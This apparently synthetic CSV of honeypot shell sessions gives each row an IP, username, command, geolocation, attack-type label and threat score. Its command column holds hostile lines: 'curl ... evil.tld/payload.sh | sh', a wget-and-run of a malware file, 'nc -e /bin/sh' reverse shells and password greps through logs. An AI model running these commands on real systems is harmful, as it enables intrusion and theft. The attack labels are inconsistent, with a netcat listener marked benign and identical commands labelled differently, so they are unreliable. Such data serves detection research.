session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10941,76.150.191.7,2025-10-03T15:25:21.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',1,3,0,,51.236156,-0.638488,GB,benign,0.115
sess_10981,156.92.12.162,2025-10-03T15:25:25.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",2,3,0,,51.211617,0.254242,GB,malware_fetch,0.14
sess_10983,208.164.205.193,2025-10-03T15:25:35.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,3,4,0,,28.286985,77.60342,IN,benign,0.195
sess_10993,191.75.32.175,2025-10-03T15:25:38.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,1,3,0,,28.858961,77.740298,IN,benign,0.115
sess_10943,174.175.141.138,2025-10-03T15:25:46.746466Z,postgres,ps aux | grep sshd,6,1,0,,28.892839,77.598173,IN,recon,0.18
sess_10965,173.17.121.42,2025-10-03T15:26:00.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",9,3,0,,52.963431,13.969936,DE,reverse_shell,0.315
sess_10940,206.213.2.196,2025-10-03T15:26:03.746466Z,root,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,3,2,0,,37.417556,-122.224934,US,benign,0.135
sess_10960,131.17.73.234,2025-10-03T15:26:05.746466Z,root,cat /etc/passwd | grep root; nc -lvp 4444 &,0,2,0,,38.36073,-122.884507,US,benign,0.06
sess_10958,200.150.190.159,2025-10-03T15:26:09.746466Z,test,curl -s http://evil.tld/payload.sh | sh,6,1,1,sha256:8d100ca1c780f10254c64e9b4593d5a8af0fa0b99af53c98db8b627611cbc00b,39.522138,116.862293,CN,payload_exec,0.68
sess_10964,158.136.67.84,2025-10-03T15:26:13.746466Z,pi,python3 -c 'print(2+2)',3,1,0,,49.432037,1.769386,FR,benign,0.105
sess_10975,90.52.241.60,2025-10-03T15:26:21.746466Z,guest,cat /etc/passwd | grep root; grep -R 'password' /var/log || true,4,2,0,,53.059385,12.854166,DE,benign,0.16
sess_10992,158.27.235.159,2025-10-03T15:26:21.746466Z,postgres,grep -R 'password' /var/log || true,1,1,0,,55.224855,37.434424,RU,benign,0.055
sess_10953,101.13.70.225,2025-10-03T15:26:22.746466Z,admin,ls -la; id; uname -a; find / -maxdepth 2 -type f | head -n 20,0,4,0,,28.540156,76.847365,IN,benign,0.12
sess_10980,118.201.20.89,2025-10-03T15:26:22.746466Z,postgres,grep -R 'password' /var/log || true,3,1,0,,37.977782,-122.988631,US,benign,0.105
sess_10982,99.180.127.71,2025-10-03T15:26:25.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,56.108169,37.268557,RU,payload_exec,0.24
sess_10934,39.226.99.151,2025-10-03T15:26:30.746466Z,root,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,48.650967,2.332136,FR,payload_exec,0.09
sess_10968,150.64.48.59,2025-10-03T15:26:31.746466Z,admin,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,39.847278,116.471358,CN,reverse_shell,0.09
sess_10942,52.166.245.242,2025-10-03T15:26:37.746466Z,root,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,2,2,0,,55.605823,37.139028,RU,benign,0.11
sess_10967,58.130.174.207,2025-10-03T15:26:46.746466Z,unknown,python3 -c 'print(2+2)',0,1,0,,37.405007,127.148751,KR,benign,0.03
sess_10962,93.187.49.123,2025-10-03T15:26:49.746466Z,unknown,cat /etc/passwd | grep root,0,1,0,,55.946852,37.909122,RU,benign,0.03
sess_10996,56.92.15.167,2025-10-03T15:26:50.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:81025a9d3fbf54a99707f782e98acc4c57ba06d9d6b542a6ecef01b8b905c89f,35.554441,139.580789,JP,malware_fetch,0.715
sess_10984,36.46.207.81,2025-10-03T15:26:51.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,48.677313,2.719277,FR,malware_fetch,0.09
sess_10947,106.8.223.9,2025-10-03T15:26:55.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,0,2,0,,37.047031,126.468663,KR,reverse_shell,0.06
sess_10936,57.249.3.82,2025-10-03T15:26:57.746466Z,postgres,ls -la; id; uname -a,5,3,0,,35.621338,139.85716,JP,benign,0.215
sess_10969,32.93.203.210,2025-10-03T15:26:58.746466Z,ubuntu,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,8,3,0,,-23.256985,-46.60261,BR,malware_fetch,0.29
sess_10948,34.57.81.205,2025-10-03T15:26:59.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,1,3,0,,39.636438,116.348946,CN,benign,0.115
sess_10989,60.211.95.218,2025-10-03T15:27:02.746466Z,user,chmod +x /tmp/h; /tmp/h &,2,2,0,,-22.972201,-46.269189,BR,reverse_shell,0.11
sess_10935,83.153.135.223,2025-10-03T15:27:09.746466Z,ubuntu,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,52.053764,13.712935,DE,payload_exec,0.115
sess_10970,210.77.24.205,2025-10-03T15:27:09.746466Z,pi,whoami; pwd; ls -la,2,3,0,,37.916721,-122.007513,US,benign,0.14
sess_10961,132.237.212.220,2025-10-03T15:27:11.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,0,2,0,,51.986859,-0.419566,GB,payload_exec,0.06
sess_10994,112.110.231.80,2025-10-03T15:27:12.746466Z,unknown,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,3,2,0,,49.432814,2.456447,FR,benign,0.135
sess_10974,46.205.63.186,2025-10-03T15:27:36.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",2,3,0,,48.269523,1.89295,FR,malware_fetch,0.14
sess_10976,76.57.238.110,2025-10-03T15:27:36.746466Z,test,find / -maxdepth 2 -type f | head -n 20; cat /etc/passwd | grep root,2,2,0,,35.808356,139.526759,JP,benign,0.11
sess_10918,139.41.209.243,2025-10-03T15:40:48.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,40.195758,116.867615,CN,recon,0.06
sess_10930,220.116.103.94,2025-10-03T15:40:53.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,1,5,0,,37.270237,-122.061899,US,benign,0.175
sess_10922,41.12.224.124,2025-10-03T15:41:07.746466Z,guest,whoami; pwd; ls -la,2,3,0,,55.670106,37.166168,RU,benign,0.14
sess_10921,51.125.236.185,2025-10-03T15:41:12.746466Z,root,find / -maxdepth 2 -type f | head -n 20; grep -R 'password' /var/log || true,1,2,0,,51.219435,0.131372,GB,recon,0.085
sess_10925,156.140.18.195,2025-10-03T15:41:48.746466Z,test,cat /etc/passwd | grep root,0,1,0,,53.05375,12.994963,DE,benign,0.03
sess_10929,68.158.105.58,2025-10-03T15:41:53.746466Z,guest,python3 -c 'print(2+2)',5,1,0,,-23.062938,-46.225327,BR,benign,0.155
sess_10919,178.199.98.218,2025-10-03T15:41:59.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:780da0b0e8ee64c5c799f355c0a0bdb043f5fad70493eadaaf96a256f41de17d,-23.99132,-47.155525,BR,malware_fetch,0.555
sess_10923,48.134.57.185,2025-10-03T15:42:03.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,5,1,0,,28.266002,76.725551,IN,malware_fetch,0.155
sess_10931,125.126.125.66,2025-10-03T15:42:10.746466Z,unknown,cat /etc/passwd | grep root,6,1,0,,51.226316,-0.394828,GB,benign,0.18
sess_10914,203.145.251.254,2025-10-03T15:42:37.746466Z,oracle,ps aux | grep sshd,0,1,0,,48.510166,1.884959,FR,recon,0.03
sess_10920,18.105.236.118,2025-10-03T15:42:42.746466Z,www-data,find / -maxdepth 2 -type f | head -n 20,0,1,0,,37.899708,-122.621889,US,benign,0.03
sess_10927,69.14.108.150,2025-10-03T15:43:12.746466Z,test,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,1,5,0,,38.046505,127.544884,KR,benign,0.175
sess_10928,175.79.160.134,2025-10-03T15:43:48.746466Z,oracle,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,0,2,0,,40.106694,115.885103,CN,benign,0.06
sess_10915,85.91.81.197,2025-10-03T15:44:02.746466Z,ftp,curl -s http://evil.tld/payload.sh | sh,4,1,1,sha256:0e7448a19f57e6b5cefb191cba90c014265e13439a3fd8fb8d46cd33e2c3e731,52.676331,13.602081,DE,reverse_shell,0.63
sess_10912,147.87.199.66,2025-10-03T15:44:03.746466Z,root,python3 -c 'print(2+2)',0,1,0,,56.337642,37.46033,RU,benign,0.03
sess_10916,186.162.200.58,2025-10-03T15:44:03.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd,0,2,0,,35.728699,139.492566,JP,benign,0.06
sess_10926,173.156.243.183,2025-10-03T15:44:22.746466Z,www-data,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,36.120477,139.400467,JP,payload_exec,0.09
sess_10913,85.161.231.173,2025-10-03T15:44:36.746466Z,root,chmod +x /tmp/h; /tmp/h &,2,2,0,,28.512372,77.526928,IN,malware_fetch,0.11
sess_10924,175.37.234.231,2025-10-03T15:44:48.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,49.201449,2.591674,FR,reverse_shell,0.03
sess_10911,118.168.199.122,2025-10-03T15:45:22.746466Z,root,nc -e /bin/sh 10.10.10.5 4444,8,1,0,,51.932627,-0.12903,GB,reverse_shell,0.23
sess_10917,129.88.50.99,2025-10-03T15:45:34.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,37.235531,127.109647,KR,reverse_shell,0.215
sess_10842,220.42.77.230,2025-10-03T16:23:40.746466Z,user,ps aux | grep sshd; ps aux | grep sshd,5,2,0,,55.272078,37.374118,RU,benign,0.185
sess_10804,46.239.234.71,2025-10-03T16:23:41.746466Z,test,chmod +x /tmp/h; /tmp/h &,0,2,0,,48.725349,1.827519,FR,malware_fetch,0.06
sess_10827,108.239.121.34,2025-10-03T16:23:44.746466Z,guest,ls -la; id; uname -a; cat /etc/passwd | grep root,0,4,0,,37.705157,126.812034,KR,benign,0.12
sess_10770,114.18.20.87,2025-10-03T16:23:45.746466Z,admin,python3 -c 'print(2+2)'; whoami; pwd; ls -la,1,4,0,,37.55071,-122.284615,US,benign,0.145
sess_10885,57.44.95.82,2025-10-03T16:23:47.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:bcddde901b37ee1eb25e86f00ed44730375748f55d8911be7f230e56de4d8dd9,53.051885,13.174339,DE,malware_fetch,0.64
sess_10846,149.99.3.126,2025-10-03T16:23:50.746466Z,pi,chmod +x /tmp/h; /tmp/h &,2,2,0,,36.086745,139.44563,JP,reverse_shell,0.11
sess_10803,129.213.217.38,2025-10-03T16:23:51.746466Z,guest,ls -la; id; uname -a; whoami; pwd; ls -la,2,6,0,,28.065058,77.69747,IN,benign,0.23
sess_10816,133.66.138.186,2025-10-03T16:23:58.746466Z,admin,chmod +x /tmp/h; /tmp/h &,2,2,0,,35.453602,140.1115,JP,malware_fetch,0.11
sess_10909,187.95.141.129,2025-10-03T16:24:00.746466Z,user,curl -s http://evil.tld/payload.sh | sh,5,1,1,sha256:e61f2660cb72dd4c1917b2174655c7c5719cbe0d67425e24c1aa76b28ed960a3,-23.212039,-46.444645,BR,payload_exec,0.655
sess_10886,185.97.67.80,2025-10-03T16:24:04.746466Z,oracle,whoami; pwd; ls -la,3,3,0,,35.416859,139.33077,JP,benign,0.165
sess_10808,197.196.215.237,2025-10-03T16:24:09.746466Z,root,ls -la; id; uname -a,0,3,0,,40.061753,115.842751,CN,benign,0.09
sess_10800,217.248.102.30,2025-10-03T16:24:11.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:ece59ef566ffc07db87dae38c1c1e8aa433222d72ca6a4e9a3eae5a308cf6507,38.174172,-122.486821,US,payload_exec,0.715
sess_10777,169.103.204.49,2025-10-03T16:24:12.746466Z,guest,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,5,3,0,,37.088977,126.931145,KR,reverse_shell,0.215
sess_10775,153.124.105.178,2025-10-03T16:24:16.746466Z,admin,cat /etc/passwd | grep root,0,1,0,,52.505175,13.21354,DE,benign,0.03
sess_10867,31.53.217.180,2025-10-03T16:24:16.746466Z,oracle,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,6,3,1,sha256:fb2479e6fe738d94255f3dcd264a1c071a6ff1588c943be274234ad50193bbd4,38.010199,126.514398,KR,malware_fetch,0.74
sess_10864,38.159.170.37,2025-10-03T16:24:19.746466Z,admin,find / -maxdepth 2 -type f | head -n 20,0,1,0,,48.996386,2.320418,FR,benign,0.03
sess_10900,143.54.238.207,2025-10-03T16:24:19.746466Z,pi,python3 -c 'print(2+2)',0,1,0,,37.329387,-122.411035,US,benign,0.03
sess_10788,200.220.184.53,2025-10-03T16:24:22.746466Z,ubuntu,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,4,2,0,,39.843323,116.957367,CN,benign,0.16
sess_10887,86.132.225.68,2025-10-03T16:24:24.746466Z,postgres,nc -e /bin/sh 10.10.10.5 4444,3,1,0,,37.9619,127.202448,KR,reverse_shell,0.105
sess_10871,12.159.96.52,2025-10-03T16:24:25.746466Z,ftp,ls -la; id; uname -a,0,3,0,,51.578387,-0.456565,GB,benign,0.09
sess_10807,198.81.118.25,2025-10-03T16:24:31.746466Z,postgres,whoami; pwd; ls -la; cat /etc/passwd | grep root,3,4,0,,37.093018,127.434906,KR,benign,0.195
sess_10823,71.225.232.244,2025-10-03T16:24:35.746466Z,root,whoami; pwd; ls -la,6,3,0,,28.085564,77.634489,IN,benign,0.24
sess_10818,120.70.59.113,2025-10-03T16:24:37.746466Z,user,whoami; pwd; ls -la; whoami; pwd; ls -la,0,6,0,,39.31626,116.303079,CN,benign,0.18
sess_10838,214.146.174.81,2025-10-03T16:24:37.746466Z,admin,chmod +x /tmp/h; /tmp/h &,1,2,0,,40.231374,116.887247,CN,malware_fetch,0.085
sess_10881,44.42.214.214,2025-10-03T16:24:38.746466Z,root,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,51.240374,0.295291,GB,malware_fetch,0.09
sess_10771,111.152.232.127,2025-10-03T16:24:39.746466Z,pi,ls -la; id; uname -a; nc -lvp 4444 &,0,4,0,,51.294831,0.097319,GB,recon,0.12
sess_10820,85.66.203.123,2025-10-03T16:24:39.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,38.15101,-121.942232,US,payload_exec,0.03
sess_10835,30.114.214.138,2025-10-03T16:24:39.746466Z,ftp,python3 -c 'print(2+2)'; echo 'hello' > /tmp/x; cat /tmp/x,1,3,0,,53.013283,13.199421,DE,benign,0.115
sess_10840,146.198.216.91,2025-10-03T16:24:42.746466Z,oracle,python3 -c 'print(2+2)',4,1,0,,37.884674,-122.279444,US,benign,0.13
sess_10792,101.0.25.65,2025-10-03T16:24:47.746466Z,pi,grep -R 'password' /var/log || true,2,1,0,,55.674261,38.119212,RU,recon,0.08
sess_10799,42.27.104.133,2025-10-03T16:24:50.746466Z,ftp,cat /etc/passwd | grep root; grep -R 'password' /var/log || true,2,2,0,,-23.28753,-46.109463,BR,benign,0.11
sess_10859,37.203.248.11,2025-10-03T16:24:57.746466Z,guest,curl -s http://evil.tld/payload.sh | sh,8,1,1,sha256:6db4b09d07a66ce0fabf784806545db406876d121d1b8c09e85baf1565d30948,-24.002129,-46.292436,BR,payload_exec,0.73
sess_10858,51.202.117.75,2025-10-03T16:24:59.746466Z,pi,curl -s http://evil.tld/payload.sh | sh,2,1,1,sha256:fe761be915fcca88a31ad5c26e2879d179f692e25f6932f7eaa24dac7faaaed8,39.328234,116.935826,CN,payload_exec,0.58
sess_10874,165.141.242.54,2025-10-03T16:25:03.746466Z,root,ls -la; id; uname -a,0,3,0,,49.306137,2.140205,FR,recon,0.09
sess_10782,188.137.253.53,2025-10-03T16:25:04.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,2,3,0,,55.159528,37.239395,RU,reverse_shell,0.14
sess_10880,194.241.232.126,2025-10-03T16:25:05.746466Z,postgres,ls -la; id; uname -a; nc -lvp 4444 &,0,4,0,,38.058335,-121.974304,US,benign,0.12
sess_10905,198.18.202.64,2025-10-03T16:25:06.746466Z,admin,python3 -c 'print(2+2)',0,1,0,,53.086223,13.63179,DE,benign,0.03
sess_10902,193.171.186.29,2025-10-03T16:25:08.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20; ls -la; id; uname -a; nc -lvp 4444 &,2,5,0,,55.465204,37.635176,RU,benign,0.2
sess_10811,103.208.36.88,2025-10-03T16:25:11.746466Z,www-data,cat /etc/passwd | grep root; cat /etc/passwd | grep root,0,2,0,,51.987107,0.296306,GB,benign,0.06
sess_10772,122.115.87.23,2025-10-03T16:25:14.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; echo 'hello' > /tmp/x; cat /tmp/x; nc -lvp 4444 &,0,4,0,,56.215783,37.068991,RU,benign,0.12
sess_10817,69.10.28.7,2025-10-03T16:25:17.746466Z,ftp,python3 -c 'print(2+2)'; python3 -c 'print(2+2)',3,2,0,,37.801029,126.893662,KR,recon,0.135
sess_10794,184.165.71.175,2025-10-03T16:25:19.746466Z,guest,chmod +x /tmp/h; /tmp/h &,5,2,0,,48.936598,2.506183,FR,malware_fetch,0.185
sess_10822,191.248.143.21,2025-10-03T16:25:21.746466Z,test,whoami; pwd; ls -la,2,3,0,,56.101328,37.060341,RU,recon,0.14
sess_10889,190.137.46.132,2025-10-03T16:25:24.746466Z,guest,nc -e /bin/sh 10.10.10.5 4444,5,1,0,,-23.393164,-46.663048,BR,malware_fetch,0.155
sess_10876,144.162.40.227,2025-10-03T16:25:26.746466Z,test,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,3,2,0,,35.911941,139.761186,JP,benign,0.135
sess_10850,73.70.192.224,2025-10-03T16:25:29.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,37.770972,-122.86125,US,malware_fetch,0.24
sess_10785,22.8.148.214,2025-10-03T16:25:33.746466Z,ftp,find / -maxdepth 2 -type f | head -n 20,0,1,0,,52.508794,13.225937,DE,benign,0.03
sess_10830,81.132.253.33,2025-10-03T16:25:33.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,5,2,0,,37.221102,-122.19807,US,payload_exec,0.185
sess_10831,123.162.21.142,2025-10-03T16:25:33.746466Z,root,grep -R 'password' /var/log || true; ls -la; id; uname -a,1,4,0,,50.96108,-0.446164,GB,benign,0.145
sess_10783,190.244.156.219,2025-10-03T16:25:39.746466Z,test,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:16227b92de9c8f4150f3ce6d22133f981fe6732bce0df6d08af6ae8689ea15d2,28.029182,77.178521,IN,malware_fetch,0.59
sess_10892,188.222.204.122,2025-10-03T16:25:41.746466Z,guest,ps aux | grep sshd; ps aux | grep sshd; nc -lvp 4444 &,0,3,0,,56.277505,38.129564,RU,benign,0.09
sess_10819,203.23.7.224,2025-10-03T16:25:44.746466Z,root,curl -s http://evil.tld/payload.sh | sh,5,1,1,sha256:09384944f10fab7e235c119084d7e6ed84fba85f3f33e1d9925b871fbd52e76f,-23.364249,-46.940207,BR,reverse_shell,0.655
sess_10873,37.110.143.46,2025-10-03T16:25:51.746466Z,user,chmod +x /tmp/h; /tmp/h &,2,2,0,,28.704687,77.63308,IN,payload_exec,0.11
sess_10784,96.10.90.250,2025-10-03T16:25:52.746466Z,admin,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:2dc9451b2ffa09b7f3ca2cd024c96bf988b98a6a3cdf5088bcdf4ea10c77bcd7,49.304462,2.319282,FR,payload_exec,0.59
